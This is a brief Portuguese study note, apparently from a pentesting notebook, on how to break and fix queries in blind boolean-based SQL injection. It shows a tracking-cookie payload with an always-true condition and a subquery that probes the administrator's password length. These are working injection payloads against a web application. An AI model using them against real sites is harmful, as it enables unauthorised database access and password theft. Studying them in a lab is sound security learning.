---
description: Resolvendo a query blind em boolean based
---

# Como quebrar e corrigir a query no boolean based.

<mark style="color:yellow;">Cookie: TrackingId=IwFid1TZfsjh5UAO</mark><mark style="color:red;">' AND '1' = '1</mark>   (Quando colocado o aspas e and

<mark style="color:green;">' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>=20)='a</mark>
